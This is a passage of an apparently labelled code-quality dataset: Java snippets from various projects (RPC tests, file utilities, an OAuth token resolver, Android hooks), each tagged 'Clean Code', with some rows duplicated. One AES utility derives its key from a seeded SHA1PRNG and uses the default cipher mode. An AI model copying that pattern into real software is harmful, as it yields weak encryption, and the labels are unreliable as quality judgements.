    ProtobufMsgFactory.load();
    final RpcServer server=RpcFactoryHelper.rpcFactory().createRpcServer(new Endpoint(""127.0.0.1"",19991));
    server.registerProcessor(new PingRequestProcessor(null));
    server.init(null);
    final Endpoint target=new Endpoint(""my.test.host1.com"",19991);
    final RpcClient client=RpcFactoryHelper.rpcFactory().createRpcClient();
    client.init(null);
    final RpcRequests.PingRequest req=RpcRequests.PingRequest.newBuilder().setSendTimestamp(System.currentTimeMillis()).build();
    for (int i=0; i < 1000; i++) {
      try {
        final Object resp=client.invokeSync(target,req,3000);
        System.out.println(resp);
      }
 catch (      final Exception e) {
        e.printStackTrace();
      }
      Thread.sleep(1000);
    }
  }
}
/** 
 * @author jiachun.fjc
 */
public class ConnectionRefreshTest {
  @Ignore @Test public void simulation() throws InterruptedException {
    ProtobufMsgFactory.load();
    final RpcServer server=RpcFactoryHelper.rpcFactory().createRpcServer(new Endpoint(""127.0.0.1"",19991));
    server.registerProcessor(new PingRequestProcessor(null));
    server.init(null);
    final Endpoint target=new Endpoint(""my.test.host1.com"",19991);
    final RpcClient client=RpcFactoryHelper.rpcFactory().createRpcClient();
    client.init(null);
    final RpcRequests.PingRequest req=RpcRequests.PingRequest.newBuilder().setSendTimestamp(System.currentTimeMillis()).build();
    for (int i=0; i < 1000; i++) {
      try {
        final Object resp=client.invokeSync(target,req,3000);
        System.out.println(resp);
      }
 catch (      final Exception e) {
        e.printStackTrace();
      }
      Thread.sleep(1000);
    }
  }
}",0,Clean Code
"/** 
 * ip2region 初始化
 * @author dream.lu
 */
@RequiredArgsConstructor public class Ip2regionSearcherImpl implements InitializingBean, DisposableBean, Ip2regionSearcher {
  private final ResourceLoader resourceLoader;
  private final Ip2regionProperties properties;
  private Searcher searcher;
  private IpV6Searcher ipV6Searcher;
  @Override public IpInfo memorySearch(  long ip){
    try {
      return IpInfoUtil.toIpInfo(searcher.search(ip));
    }
 catch (    IOException e) {
      throw Exceptions.unchecked(e);
    }
  }
  @Override public IpInfo memorySearch(  String ip){
    String[] ipV4Part=IpInfoUtil.getIpV4Part(ip);
    if (ipV4Part.length == 4) {
      return memorySearch(Searcher.getIpAdder(ipV4Part));
    }
    if (!ip.contains("":"")) {
      throw new IllegalArgumentException(""invalid ip address `"" + ip + ""`"");
    }
    return ipV6Searcher.query(ip);
  }
  @Override public void afterPropertiesSet() throws Exception {
    Resource resource=resourceLoader.getResource(properties.getDbFileLocation());
    try (InputStream inputStream=resource.getInputStream()){
      this.searcher=Searcher.newWithBuffer(StreamUtils.copyToByteArray(inputStream));
    }
     Resource ipV6Resource=resourceLoader.getResource(properties.getIpv6dbFileLocation());
    try (InputStream inputStream=ipV6Resource.getInputStream()){
      this.ipV6Searcher=IpV6Searcher.newWithBuffer(StreamUtils.copyToByteArray(inputStream));
    }
   }
  @Override public void destroy() throws Exception {
    if (this.searcher != null) {
      this.searcher.close();
    }
  }
}
",0,Clean Code
"/** 
 * A property accessor is able to read from (and possibly write to) an object's properties. This interface places no restrictions, and so implementors are free to access properties directly as fields or through getters or in any other way they see as appropriate. <p>A resolver can optionally specify an array of target classes for which it should be called. However, if it returns  {@code null} from {@link #getSpecificTargetClasses()}, it will be called for all property references and given a chance to determine if it can read or write them. <p>Property resolvers are considered to be ordered and each will be called in turn. The only rule that affects the call order is that any naming the target class directly in  {@link #getSpecificTargetClasses()} will be called first, before the general resolvers.
 * @author Andy Clement
 * @since 3.0
 */
interface PropertyAccessor {
  /** 
 * Return an array of classes for which this resolver should be called. <p>>Returning  {@code null} indicates this is a general resolver thatcan be called in an attempt to resolve a property on any type.
 * @return an array of classes that this resolver is suitable for(or  {@code null} if a general resolver)
 */
  Class<?>[] getSpecificTargetClasses();
  /** 
 * Called to determine if a resolver instance is able to access a specified property on a specified target object.
 * @param context the evaluation context in which the access is being attempted
 * @param target the target object upon which the property is being accessed
 * @param name the name of the property being accessed
 * @return true if this resolver is able to read the property
 * @throws AccessException if there is any problem determining whether the property can be read
 */
  boolean canRead(  EvaluationContext context,  Object target,  String name) throws AccessException ;
  /** 
 * Called to read a property from a specified target object. Should only succeed if  {@link #canRead} also returns {@code true}.
 * @param context the evaluation context in which the access is being attempted
 * @param target the target object upon which the property is being accessed
 * @param name the name of the property being accessed
 * @return a TypedValue object wrapping the property value read and a type descriptor for it
 * @throws AccessException if there is any problem accessing the property value
 */
  TypedValue read(  EvaluationContext context,  Object target,  String name) throws AccessException ;
  /** 
 * Called to determine if a resolver instance is able to write to a specified property on a specified target object.
 * @param context the evaluation context in which the access is being attempted
 * @param target the target object upon which the property is being accessed
 * @param name the name of the property being accessed
 * @return true if this resolver is able to write to the property
 * @throws AccessException if there is any problem determining whether theproperty can be written to
 */
  boolean canWrite(  EvaluationContext context,  Object target,  String name) throws AccessException ;
  /** 
 * Called to write to a property on a specified target object. Should only succeed if  {@link #canWrite} also returns {@code true}.
 * @param context the evaluation context in which the access is being attempted
 * @param target the target object upon which the property is being accessed
 * @param name the name of the property being accessed
 * @param newValue the new value for the property
 * @throws AccessException if there is any problem writing to the property value
 */
  void write(  EvaluationContext context,  Object target,  String name,  Object newValue) throws AccessException ;
}
",0,Clean Code
"public interface UserStopResultOrBuilder extends com.google.protobuf.MessageOrBuilder {
  /** 
 * <pre> 停驻用户 Id </pre> <code>uint32 stopUserId = 1;</code>
 * @return The stopUserId.
 */
  int getStopUserId();
  /** 
 * <pre> 停驻在位置 X </pre> <code>float stopAtPosX = 2;</code>
 * @return The stopAtPosX.
 */
  float getStopAtPosX();
  /** 
 * <pre> 停驻在位置 Y </pre> <code>float stopAtPosY = 3;</code>
 * @return The stopAtPosY.
 */
  float getStopAtPosY();
}
public interface UserStopResultOrBuilder extends com.google.protobuf.MessageOrBuilder {
  /** 
 * <pre> 停驻用户 Id </pre> <code>uint32 stopUserId = 1;</code>
 * @return The stopUserId.
 */
  int getStopUserId();
  /** 
 * <pre> 停驻在位置 X </pre> <code>float stopAtPosX = 2;</code>
 * @return The stopAtPosX.
 */
  float getStopAtPosX();
  /** 
 * <pre> 停驻在位置 Y </pre> <code>float stopAtPosY = 3;</code>
 * @return The stopAtPosY.
 */
  float getStopAtPosY();
}
public interface UserStopResultOrBuilder extends com.google.protobuf.MessageOrBuilder {
  /** 
 * <pre> 停驻用户 Id </pre> <code>uint32 stopUserId = 1;</code>
 * @return The stopUserId.
 */
  int getStopUserId();
  /** 
 * <pre> 停驻在位置 X </pre> <code>float stopAtPosX = 2;</code>
 * @return The stopAtPosX.
 */
  float getStopAtPosX();
  /** 
 * <pre> 停驻在位置 Y </pre> <code>float stopAtPosY = 3;</code>
 * @return The stopAtPosY.
 */
  float getStopAtPosY();
}
",0,Clean Code
"public class HttpFileServerController {
  private static final Logger logger=LoggerFactory.getLogger(HttpFileServerController.class);
  private Map<String,ChannelHandlerContext> contextMap=null;
private static class BrokenUploadInfoHandlerHolder {
    private static HttpFileServerController singleton=new HttpFileServerController();
  }
  /** 
 * constructor
 */
  private HttpFileServerController(){
    contextMap=new ConcurrentHashMap<String,ChannelHandlerContext>();
  }
  /** 
 * getInstance
 */
  public static HttpFileServerController getInstance(){
    return BrokenUploadInfoHandlerHolder.singleton;
  }
  /** 
 * mapChannelHandlerContext
 * @param requestId
 * @param ctx
 */
  public synchronized void mapChannelHandlerContext(  String requestId,  ChannelHandlerContext ctx){
    if (contextMap.containsKey(requestId)) {
      logger.warn(""contextMap has already contained the key:"" + requestId);
    }
    contextMap.put(requestId,ctx);
  }
  /** 
 * getContext
 * @param requestId
 * @return
 */
  public ChannelHandlerContext getChannelHandlerContext(  String requestId){
    if (!contextMap.containsKey(requestId)) {
      logger.warn(""contextMap not contains the key:"" + requestId);
      return null;
    }
    return contextMap.get(requestId);
  }
  /** 
 * removeContext
 * @param requestId
 */
  public void removeChannelHandlerContext(  String requestId){
    if (!contextMap.containsKey(requestId)) {
      logger.warn(""contextMap not contains the key:"" + requestId);
      return;
    }
    contextMap.remove(requestId);
  }
}
",0,Clean Code
"public class FileUtil {
  private static Logger logger=LoggerFactory.getLogger(FileUtil.class);
  /** 
 * delete recursively
 * @param root
 * @return
 */
  public static boolean deleteRecursively(  File root){
    if (root != null && root.exists()) {
      if (root.isDirectory()) {
        File[] children=root.listFiles();
        if (children != null) {
          for (          File child : children) {
            deleteRecursively(child);
          }
        }
      }
      return root.delete();
    }
    return false;
  }
  public static void deleteFile(  String fileName){
    File file=new File(fileName);
    if (file.exists()) {
      file.delete();
    }
  }
  public static void writeFileContent(  File file,  byte[] data){
    if (!file.exists()) {
      file.getParentFile().mkdirs();
    }
    FileOutputStream fos=null;
    try {
      fos=new FileOutputStream(file);
      fos.write(data);
      fos.flush();
    }
 catch (    Exception e) {
      logger.error(e.getMessage(),e);
    }
 finally {
      if (fos != null) {
        try {
          fos.close();
        }
 catch (        IOException e) {
          logger.error(e.getMessage(),e);
        }
      }
    }
  }
  public static byte[] readFileContent(  File file){
    Long filelength=file.length();
    byte[] filecontent=new byte[filelength.intValue()];
    FileInputStream in=null;
    try {
      in=new FileInputStream(file);
      in.read(filecontent);
      in.close();
    }
 catch (    Exception e) {
      logger.error(e.getMessage(),e);
    }
 finally {
      if (in != null) {
        try {
          in.close();
        }
 catch (        IOException e) {
          logger.error(e.getMessage(),e);
        }
      }
    }
    return filecontent;
  }
}
",0,Clean Code
"public class DoNothingGoal extends GoalSelector {
  private static final Random RANDOM=new Random();
  private final long time;
  private final float chance;
  private long startTime;
  /** 
 * Create a DoNothing goal
 * @param entityCreature the entity
 * @param time           the time in milliseconds where nothing happen
 * @param chance         the chance to do nothing (0-1)
 */
  public DoNothingGoal(  EntityCreature entityCreature,  long time,  float chance){
    super(entityCreature);
    this.time=time;
    this.chance=MathUtils.clamp(chance,0,1);
  }
  @Override public void end(){
    this.startTime=0;
  }
  @Override public boolean shouldEnd(){
    return System.currentTimeMillis() - startTime >= time;
  }
  @Override public boolean shouldStart(){
    return RANDOM.nextFloat() <= chance;
  }
  @Override public void start(){
    this.startTime=System.currentTimeMillis();
  }
  @Override public void tick(  long time){
  }
}
",0,Clean Code
"@KestraTest(startRunner=true) public class TaskWithAllowWarningTest {
  @Inject private StorageInterface storageInterface;
  @Inject private FlowInputOutput flowIO;
  @Inject private RunnerUtils runnerUtils;
  @Test @ExecuteFlow(""flows/valids/task-allow-warning-runnable.yml"") void runnableTask(  Execution execution){
    assertThat(execution.getState().getCurrent(),is(State.Type.SUCCESS));
    assertThat(execution.getTaskRunList(),hasSize(2));
    assertThat(execution.findTaskRunsByTaskId(""fail"").getFirst().getAttempts().size(),is(3));
  }
  @Test @LoadFlows({""flows/valids/task-allow-warning-executable-flow.yml"",""flows/valids/for-each-item-subflow-failed.yaml""}) void executableTask_Flow() throws QueueException, TimeoutException {
    Execution execution=runnerUtils.runOne(null,""io.kestra.tests"",""task-allow-warning-executable-flow"");
    assertThat(execution.getState().getCurrent(),is(State.Type.SUCCESS));
    assertThat(execution.getTaskRunList(),hasSize(2));
  }
  @Test @LoadFlows({""flows/valids/task-allow-warning-executable-foreachitem.yml""}) void executableTask_ForEachItem() throws TimeoutException, QueueException, URISyntaxException, IOException {
    URI file=storageUpload();
    Map<String,Object> inputs=Map.of(""file"",file.toString());
    Execution execution=runnerUtils.runOne(null,""io.kestra.tests"",""task-allow-warning-executable-foreachitem"",null,(flow,execution1) -> flowIO.readExecutionInputs(flow,execution1,inputs));
    assertThat(execution.getState().getCurrent(),is(State.Type.SUCCESS));
    assertThat(execution.getTaskRunList(),hasSize(4));
  }
  @Test @ExecuteFlow(""flows/valids/task-allow-warning-flowable.yml"") void flowableTask(  Execution execution){
    assertThat(execution.getState().getCurrent(),is(State.Type.SUCCESS));
    assertThat(execution.getTaskRunList(),hasSize(3));
  }
  private URI storageUpload() throws URISyntaxException, IOException {
    File tempFile=File.createTempFile(""file"","".txt"");
    Files.write(tempFile.toPath(),content());
    return storageInterface.put(null,null,new URI(""/file/storage/file.txt""),new FileInputStream(tempFile));
  }
  private List<String> content(){
    return IntStream.range(0,10).mapToObj(value -> StringUtils.leftPad(value + """",20)).toList();
  }
}
",0,Clean Code
"/** 
 * Represents a set of names and Blocks. 
 */
public class BlockList extends PairList<String,Block> {
  /** 
 * Creates an empty  {@code BlockList}. 
 */
  public BlockList(){
  }
  /** 
 * Constructs an empty  {@code BlockList} with the specified initial capacity.
 * @param initialCapacity the initial capacity of the list
 * @throws IllegalArgumentException if the specified initial capacity is negative
 */
  public BlockList(  int initialCapacity){
    super(initialCapacity);
  }
  /** 
 * Constructs a  {@code BlockList} containing the elements of the specified keys and values.
 * @param keys the key list containing the elements to be placed into this {@code BlockList}
 * @param values the value list containing the elements to be placed into this {@code BlockList}
 * @throws IllegalArgumentException if the keys and values size are different
 */
  public BlockList(  List<String> keys,  List<Block> values){
    super(keys,values);
  }
  /** 
 * Constructs a  {@code BlockList} containing the elements of the specified list of Pairs.
 * @param list the list containing the elements to be placed into this {@code BlockList}
 */
  public BlockList(  List<Pair<String,Block>> list){
    super(list);
  }
  /** 
 * Constructs a  {@code BlockList} containing the elements of the specified map.
 * @param map the map containing keys and values
 */
  public BlockList(  Map<String,Block> map){
    super(map);
  }
}
",0,Clean Code
"/** 
 * An sample of  {@link AsyncFunction} using a thread pool and executing working threadsto simulate multiple async operations. <p>For the real use case in production environment, the thread pool may stay in the async client.
 */
private static class SampleAsyncFunction extends RichAsyncFunction<Integer,String> {
  private static final long serialVersionUID=2098635244857937717L;
  private transient ExecutorService executorService;
  /** 
 * The result of multiplying sleepFactor with a random float is used to pause the working thread in the thread pool, simulating a time consuming async operation.
 */
  private final long sleepFactor;
  /** 
 * The ratio to generate an exception to simulate an async error. For example, the error may be a TimeoutException while visiting HBase.
 */
  private final float failRatio;
  private final long shutdownWaitTS;
  SampleAsyncFunction(  long sleepFactor,  float failRatio,  long shutdownWaitTS){
    this.sleepFactor=sleepFactor;
    this.failRatio=failRatio;
    this.shutdownWaitTS=shutdownWaitTS;
  }
  @Override public void open(  Configuration parameters) throws Exception {
    super.open(parameters);
    executorService=Executors.newFixedThreadPool(30);
  }
  @Override public void close() throws Exception {
    super.close();
    ExecutorUtils.gracefulShutdown(shutdownWaitTS,TimeUnit.MILLISECONDS,executorService);
  }
  @Override public void asyncInvoke(  final Integer input,  final ResultFuture<String> resultFuture){
    executorService.submit(() -> {
      long sleep=(long)(ThreadLocalRandom.current().nextFloat() * sleepFactor);
      try {
        Thread.sleep(sleep);
        if (ThreadLocalRandom.current().nextFloat() < failRatio) {
          resultFuture.completeExceptionally(new Exception(""wahahahaha...""));
        }
 else {
          resultFuture.complete(Collections.singletonList(""key-"" + (input % 10)));
        }
      }
 catch (      InterruptedException e) {
        resultFuture.complete(new ArrayList<>(0));
      }
    }
);
  }
}
",0,Clean Code
"public class EngineConnPluginClassLoader extends URLClassLoader {
  private static final Logger logger=LoggerFactory.getLogger(EngineConnPluginClassLoader.class);
  /** 
 * Reverse order 
 */
  private boolean reverseOrder=false;
  /** 
 * To combine other class loader 
 */
  private List<ClassLoader> extendedLoaders=new ArrayList<>();
  public EngineConnPluginClassLoader(  URL[] urls,  ClassLoader parent){
    super(urls,parent);
  }
  public EngineConnPluginClassLoader(  URL[] urls,  ClassLoader parent,  List<ClassLoader> extendedLoaders,  boolean reverseOrder){
    super(urls,parent);
    this.extendedLoaders=extendedLoaders;
    this.reverseOrder=reverseOrder;
  }
  @Override protected Class<?> findClass(  String name) throws ClassNotFoundException {
    if (!extendedLoaders.isEmpty()) {
      for (      ClassLoader extend : extendedLoaders) {
        try {
          return extend.loadClass(name);
        }
 catch (        ClassNotFoundException e) {
        }
      }
    }
    return super.findClass(name);
  }
  /** 
 * Change the order to load class (if you need)
 * @param name
 * @param resolve
 * @return
 * @throws ClassNotFoundException
 */
  private Class<?> loadClassReverse(  String name,  boolean resolve) throws ClassNotFoundException {
synchronized (getClassLoadingLock(name)) {
      Class<?> c=findLoadedClass(name);
      if (c == null) {
        try {
          c=findClass(name);
        }
 catch (        ClassNotFoundException e) {
        }
        if (c == null) {
          return super.loadClass(name,resolve);
        }
      }
      if (resolve) {
        resolveClass(c);
      }
      return c;
    }
  }
  @Override protected Class<?> loadClass(  String name,  boolean resolve) throws ClassNotFoundException {
    if (reverseOrder) {
      return loadClassReverse(name,resolve);
    }
    return super.loadClass(name,resolve);
  }
  /** 
 * Construct method
 * @param urls classpath urls
 * @param parent parent classloader
 * @return
 */
  public static EngineConnPluginClassLoader custom(  URL[] urls,  ClassLoader parent){
    return custom(urls,parent,Collections.emptyList(),false);
  }
  /** 
 * Close the classloader
 * @throws IOException
 */
  @Override public void close() throws IOException {
    super.close();
  }
  public static EngineConnPluginClassLoader custom(  URL[] urls,  ClassLoader parent,  List<ClassLoader> extendedLoaders){
    return custom(urls,parent,extendedLoaders,false);
  }
  public static EngineConnPluginClassLoader custom(  URL[] urls,  ClassLoader parent,  List<ClassLoader> extendedLoaders,  boolean reverseOrder){
    return AccessController.doPrivileged((PrivilegedAction<EngineConnPluginClassLoader>)() -> new EngineConnPluginClassLoader(urls,parent,Collections.emptyList(),reverseOrder));
  }
}
",0,Clean Code
"public abstract class BaseCallView extends RelativeLayout {
  protected Context mContext;
  protected TUICallingAction mCallingAction;
  public BaseCallView(  Context context){
    super(context);
    mContext=context;
    mCallingAction=new TUICallingAction(context);
  }
  public void userEnter(  CallingUserModel userModel){
  }
  public void userAdd(  CallingUserModel userModel){
  }
  public void userLeave(  CallingUserModel userModel){
  }
  public void updateUserInfo(  CallingUserModel userModel){
  }
  public void updateCallingHint(  String hint){
  }
  public void updateCallTimeView(  String time){
  }
  public void updateUserView(  View view){
  }
  public void updateFunctionView(  View view){
  }
  public void updateSwitchAudioView(  View view){
  }
  public void addOtherUserView(  View view){
  }
  public void enableFloatView(  View view){
  }
  public void enableAddUserView(  View view){
  }
  public void updateBackgroundColor(  int color){
  }
  public void updateTextColor(  int color){
  }
  public void finish(){
    clearAllViews();
    removeAllViews();
    detachAllViewsFromParent();
    onDetachedFromWindow();
  }
  public void clearAllViews(){
    updateCallingHint("""");
    updateCallTimeView(null);
    updateUserView(null);
    updateFunctionView(null);
    updateSwitchAudioView(null);
    addOtherUserView(null);
  }
}
",0,Clean Code
"private static class UsageStatsManagerInvocationHandler implements InvocationHandler, ExceptionTransformedInvocationHandler {
  private final Object original;
  public UsageStatsManagerInvocationHandler(  Object original){
    this.original=original;
  }
  @Override public Object invoke(  Object o,  Method method,  Object[] args) throws Throwable {
    if (XposedHelpersExt.matchMethodNameAndArgs(method,""reportEvent"",ComponentName.class,int.class,int.class,int.class,ComponentName.class)) {
      handleReportEvent(args);
    }
    return tryInvoke(original,method,args);
  }
  private void handleReportEvent(  Object[] args){
    XLog.d(""UsageStatsManagerInternalHooks handleReportEvent %s"",Arrays.toString(args));
    try {
      int userId=(int)args[1];
      int type=(int)args[2];
      ComponentName component=(ComponentName)args[0];
      if (type == UsageEvents.Event.MOVE_TO_BACKGROUND) {
        XLog.d(""UsageStatsManagerInternalHooks, MOVE_TO_BACKGROUND: %s"",component);
        BootStrap.THANOS_X.getActivityStackSupervisor().reportOnActivityStopped(new Intent().setComponent(component));
      }
 else       if (type == UsageEvents.Event.MOVE_TO_FOREGROUND) {
        XLog.d(""UsageStatsManagerInternalHooks, MOVE_TO_FOREGROUND: %s"",component);
        BootStrap.THANOS_X.getActivityStackSupervisor().reportOnActivityResumed(new Intent().setComponent(component),userId);
      }
    }
 catch (    Throwable e) {
      XLog.e(""UsageStatsManagerInternalHooks reportEvent error"",e);
    }
  }
}
",0,Clean Code
"/** 
 * @author : zlt
 * @date : 2023/11/8 <p> Blog: http://zlt2000.gitee.io Github: https://github.com/zlt2000
 */
@ConditionalOnClass(HttpServletRequest.class) @Component public class CustomBearerTokenResolver implements BearerTokenResolver {
  private final boolean allowFormEncodedBodyParameter=false;
  private final boolean allowUriQueryParameter=true;
  private final String bearerTokenHeaderName=HttpHeaders.AUTHORIZATION;
  private final PathMatcher pathMatcher=new AntPathMatcher();
  private final PermitProperties permitProperties;
  public CustomBearerTokenResolver(  SecurityProperties securityProperties){
    this.permitProperties=securityProperties.getIgnore();
  }
  @Override public String resolve(  HttpServletRequest request){
    boolean match=Arrays.stream(permitProperties.getUrls()).anyMatch(url -> pathMatcher.match(url,request.getRequestURI()));
    if (match) {
      return null;
    }
    final String authorizationHeaderToken=AuthUtils.extractHeaderToken(request);
    final String parameterToken=isParameterTokenSupportedForRequest(request) ? resolveFromRequestParameters(request) : null;
    if (authorizationHeaderToken != null) {
      if (parameterToken != null) {
        final BearerTokenError error=BearerTokenErrors.invalidRequest(""Found multiple bearer tokens in the request"");
        throw new OAuth2AuthenticationException(error);
      }
      return authorizationHeaderToken;
    }
    if (parameterToken != null && isParameterTokenEnabledForRequest(request)) {
      return parameterToken;
    }
    return null;
  }
  private static String resolveFromRequestParameters(  HttpServletRequest request){
    String[] values=request.getParameterValues(""access_token"");
    if (values == null || values.length == 0) {
      return null;
    }
    if (values.length == 1) {
      return values[0];
    }
    BearerTokenError error=BearerTokenErrors.invalidRequest(""Found multiple bearer tokens in the request"");
    throw new OAuth2AuthenticationException(error);
  }
  private boolean isParameterTokenSupportedForRequest(  final HttpServletRequest request){
    return ((""POST"".equals(request.getMethod()) && MediaType.APPLICATION_FORM_URLENCODED_VALUE.equals(request.getContentType())) || ""GET"".equals(request.getMethod()));
  }
  private boolean isParameterTokenEnabledForRequest(  final HttpServletRequest request){
    return ((this.allowFormEncodedBodyParameter && ""POST"".equals(request.getMethod()) && MediaType.APPLICATION_FORM_URLENCODED_VALUE.equals(request.getContentType())) || (this.allowUriQueryParameter && ""GET"".equals(request.getMethod())));
  }
}
",0,Clean Code
"/** 
 * 商品收藏 Service 接口
 * @author jason
 */
public interface ProductFavoriteService {
  /** 
 * 创建商品收藏
 * @param userId 用户编号
 * @param spuId SPU 编号
 */
  Long createFavorite(  Long userId,  Long spuId);
  /** 
 * 取消商品收藏
 * @param userId 用户编号
 * @param spuId SPU 编号
 */
  void deleteFavorite(  Long userId,  Long spuId);
  /** 
 * 分页查询用户收藏列表
 * @param userId 用户编号
 * @param reqVO 请求 vo
 */
  PageResult<ProductFavoriteDO> getFavoritePage(  Long userId,  @Valid AppFavoritePageReqVO reqVO);
  /** 
 * 分页查询用户收藏列表
 * @param reqVO 请求 vo
 */
  PageResult<ProductFavoriteDO> getFavoritePage(  @Valid ProductFavoritePageReqVO reqVO);
  /** 
 * 获取收藏过商品
 * @param userId 用户编号
 * @param spuId SPU 编号
 */
  ProductFavoriteDO getFavorite(  Long userId,  Long spuId);
  /** 
 * 获取用户收藏数量
 * @param userId 用户编号
 * @return 数量
 */
  Long getFavoriteCount(  Long userId);
}
",0,Clean Code
"@Trigger(Trigger.TRIGGER_TIME_HOME_PAGE) public class ScreenOrientationChangeTrigger implements Runnable {
  private static final String TAG=ScreenOrientationChangeTrigger.class.getSimpleName();
  @Override public void run(){
    IntentFilter filter=new IntentFilter();
    filter.addAction(Intent.ACTION_CONFIGURATION_CHANGED);
    LauncherApplication.getInstance().registerReceiver(new ScreenOrientationChangeEventListener(),filter);
  }
  /** 
 * 屏幕方向旋转监听器
 */
private static class ScreenOrientationChangeEventListener extends BroadcastReceiver {
    @Override public void onReceive(    Context context,    Intent intent){
      if (intent == null) {
        return;
      }
      String action=intent.getAction();
      if (StringUtil.equals(action,Intent.ACTION_CONFIGURATION_CHANGED)) {
        LogUtil.i(TAG,""Intent extras: "" + intent.getExtras());
        LogUtil.i(TAG,""Intent data: "" + intent.getData());
        LogUtil.i(TAG,""Intent scheme: "" + intent.getScheme());
        if (InjectorService.g() == null) {
          return;
        }
        Activity activity=(Activity)LauncherApplication.getInstance().loadActivityOnTop();
        if (activity != null) {
          InjectorService.g().pushMessage(SCREEN_ORIENTATION,activity.getWindowManager().getDefaultDisplay().getRotation());
          return;
        }
        Service service=(Service)LauncherApplication.getInstance().loadRunningService();
        if (service == null) {
          LogUtil.w(TAG,""No Foreground service or activity"");
          return;
        }
        WindowManager wm=(WindowManager)service.getSystemService(Context.WINDOW_SERVICE);
        int rotation=wm.getDefaultDisplay().getRotation();
        InjectorService.g().pushMessage(SCREEN_ORIENTATION,rotation);
      }
    }
  }
}
",0,Clean Code
"public class BasicBlockStatement extends Statement {
  private final BasicBlock block;
  public BasicBlockStatement(  BasicBlock block){
    type=Statement.TYPE_BASICBLOCK;
    this.block=block;
    id=block.id;
    CounterContainer coun=DecompilerContext.getCounterContainer();
    if (id >= coun.getCounter(CounterContainer.STATEMENT_COUNTER)) {
      coun.setCounter(CounterContainer.STATEMENT_COUNTER,id + 1);
    }
    Instruction instr=block.getLastInstruction();
    if (instr != null) {
      if (instr.group == CodeConstants.GROUP_JUMP && instr.opcode != CodeConstants.opc_goto) {
        lastBasicType=LASTBASICTYPE_IF;
      }
 else       if (instr.group == CodeConstants.GROUP_SWITCH) {
        lastBasicType=LASTBASICTYPE_SWITCH;
      }
    }
    buildMonitorFlags();
  }
  @Override public TextBuffer toJava(  int indent,  BytecodeMappingTracer tracer){
    TextBuffer tb=ExprProcessor.listToJava(varDefinitions,indent,tracer);
    tb.append(ExprProcessor.listToJava(exprents,indent,tracer));
    return tb;
  }
  @Override public Statement getSimpleCopy(){
    BasicBlock newblock=new BasicBlock(DecompilerContext.getCounterContainer().getCounterAndIncrement(CounterContainer.STATEMENT_COUNTER));
    SimpleInstructionSequence seq=new SimpleInstructionSequence();
    for (int i=0; i < block.getSeq().length(); i++) {
      seq.addInstruction(block.getSeq().getInstr(i).clone(),-1);
    }
    newblock.setSeq(seq);
    return new BasicBlockStatement(newblock);
  }
  public BasicBlock getBlock(){
    return block;
  }
}
",0,Clean Code
"/** 
 * Attribute class for standards-track  {@code EnclosingMethod}attributes.
 */
public final class AttEnclosingMethod extends BaseAttribute {
  /** 
 * {@code non-null;} attribute name for attributes of this type 
 */
  public static final String ATTRIBUTE_NAME=""EnclosingMethod"";
  /** 
 * {@code non-null;} the innermost enclosing class 
 */
  private final CstType type;
  /** 
 * {@code null-ok;} the name-and-type of the innermost enclosing method, if any 
 */
  private final CstNat method;
  /** 
 * Constructs an instance.
 * @param type {@code non-null;} the innermost enclosing class
 * @param method {@code null-ok;} the name-and-type of the innermost enclosingmethod, if any
 */
  public AttEnclosingMethod(  CstType type,  CstNat method){
    super(ATTRIBUTE_NAME);
    if (type == null) {
      throw new NullPointerException(""type == null"");
    }
    this.type=type;
    this.method=method;
  }
  /** 
 * {@inheritDoc} 
 */
  @Override public int byteLength(){
    return 10;
  }
  /** 
 * Gets the innermost enclosing class.
 * @return {@code non-null;} the innermost enclosing class
 */
  public CstType getEnclosingClass(){
    return type;
  }
  /** 
 * Gets the name-and-type of the innermost enclosing method, if any.
 * @return {@code null-ok;} the name-and-type of the innermost enclosingmethod, if any
 */
  public CstNat getMethod(){
    return method;
  }
}
",0,Clean Code
"@Slf4j public class AESUtil {
  private static String DEFAULT_CIPHER_ALGORITHM=""SHA1PRNG"";
  private static String KEY_ALGORITHM=""AES"";
  /** 
 * 加密
 * @param key
 * @param messBytes
 * @return
 */
  private static byte[] encrypt(  Key key,  byte[] messBytes) throws Exception {
    if (key != null) {
      Cipher cipher=Cipher.getInstance(KEY_ALGORITHM);
      cipher.init(Cipher.ENCRYPT_MODE,key);
      return cipher.doFinal(messBytes);
    }
    return null;
  }
  /** 
 * AES（256）解密
 * @param key
 * @param cipherBytes
 * @return
 */
  private static byte[] decrypt(  Key key,  byte[] cipherBytes) throws Exception {
    if (key != null) {
      Cipher cipher=Cipher.getInstance(KEY_ALGORITHM);
      cipher.init(Cipher.DECRYPT_MODE,key);
      return cipher.doFinal(cipherBytes);
    }
    return null;
  }
  /** 
 * 生成加密秘钥
 * @return
 * @throws NoSuchAlgorithmException
 */
  private static KeyGenerator getKeyGenerator(){
    String key=JobAdminConfig.getAdminConfig().getDataSourceAESKey();
    KeyGenerator keygen=null;
    try {
      keygen=KeyGenerator.getInstance(KEY_ALGORITHM);
      SecureRandom secureRandom=SecureRandom.getInstance(DEFAULT_CIPHER_ALGORITHM);
      secureRandom.setSeed(key.getBytes());
      keygen.init(128,secureRandom);
    }
 catch (    NoSuchAlgorithmException e) {
      log.warn(""Get key generator error {}"",e.getMessage());
    }
    return keygen;
  }
  public static String encrypt(  String message){
    try {
      KeyGenerator keygen=getKeyGenerator();
      SecretKey secretKey=new SecretKeySpec(keygen.generateKey().getEncoded(),KEY_ALGORITHM);
      return Base64.getEncoder().encodeToString(encrypt(secretKey,message.getBytes(StandardCharsets.UTF_8)));
    }
 catch (    Exception e) {
      log.warn(""content encrypt error {}"",e.getMessage());
    }
    return null;
  }
  public static String decrypt(  String ciphertext){
    try {
      KeyGenerator keygen=getKeyGenerator();
      SecretKey secretKey=new SecretKeySpec(keygen.generateKey().getEncoded(),KEY_ALGORITHM);
      return new String(decrypt(secretKey,Base64.getDecoder().decode(ciphertext)),StandardCharsets.UTF_8);
    }
 catch (    Exception e) {
      log.warn(""content decrypt error {}"",e.getMessage());
    }
    return null;
  }
  public static void main(  String[] args){
    String message=""root"";
    String ciphertext=encrypt(message);
    System.out.println(""加密后密文为: "" + ciphertext);
    System.out.println(""解密后明文为:"" + decrypt(ciphertext));
  }
}
",0,Clean Code
"@SuppressWarnings(""unused"") public interface VM {
  int JNI_FALSE=0;
  int JNI_TRUE=1;
  int JNI_OK=0;
  int JNI_ERR=-1;
  int JNI_NULL=0;
  int JNI_COMMIT=1;
  int JNI_ABORT=2;
  int JNI_VERSION_1_1=0x00010001;
  int JNI_VERSION_1_2=0x00010002;
  int JNI_VERSION_1_4=0x00010004;
  int JNI_VERSION_1_6=0x00010006;
  int JNI_VERSION_1_8=0x00010008;
  int JNIInvalidRefType=0;
